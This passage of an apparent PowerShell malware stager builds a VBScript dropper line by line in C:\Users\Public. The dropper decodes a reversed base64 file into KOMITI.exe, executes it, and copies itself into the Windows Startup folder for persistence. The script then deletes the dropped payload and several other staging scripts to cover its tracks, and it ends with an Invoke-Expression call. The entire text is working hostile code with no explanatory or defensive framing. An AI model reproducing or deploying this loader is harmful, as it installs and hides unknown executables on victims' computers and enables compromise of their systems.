Add-Content -Path C:\Users\Public\megaa.vbs -Value 'End if' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set objXMLHTTP = Nothing' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'inputFile = "C:\Users\Public\KOMITI.BIN"' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'outputFile = "C:\Users\Public\KOMITI.exe"' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set fso = CreateObject("Scripting.Filesystemobject")' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set input=fso.OpenTextFile(inputFile,1)' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'contents = input.ReadAll()' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'contents = StrReverse(contents) ' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'input.Close' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set oXML = CreateObject("Msxml2.DOMDocument")' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set oNode = oXML.CreateElement("base64")' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'oNode.dataType = "bin.base64"' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'oNode.text = contents' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set BinaryStream = CreateObject("ADODB.Stream")' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'BinaryStream.Type = 1' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'BinaryStream.Open' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'BinaryStream.Write oNode.nodeTypedValue' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'BinaryStream.SaveToFile outputFile' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set objShell = CreateObject("WScript.Shell")' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'objShell.Exec("C:\Users\Public\KOMITI.exe")' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'CreateObject("Shell.Application").Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024' -Force
Invoke-Item 'C:\Users\Public\megaa.vbs'
start-sleep -s 10
Remove-Item -Path C:\Users\Public\megaa.vbs -Force
Remove-Item -Path C:\Users\Public\KOMITI.BIN -Force
Remove-Item -Path C:\Users\Public\KOMITI.exe -Force
Remove-Item -Path C:\Users\Public\Chrome.vbs -Force
Remove-Item -Path C:\Users\Public\meta.ps1 -Force
Remove-Item -Path C:\Users\Public\Cola.ps1 -Force
Remove-Item -Path C:\Users\Public\Tackel.ps1 -Force
Remove-Item -Path C:\Users\Public\common.vbs -Force

}

}
IEX metay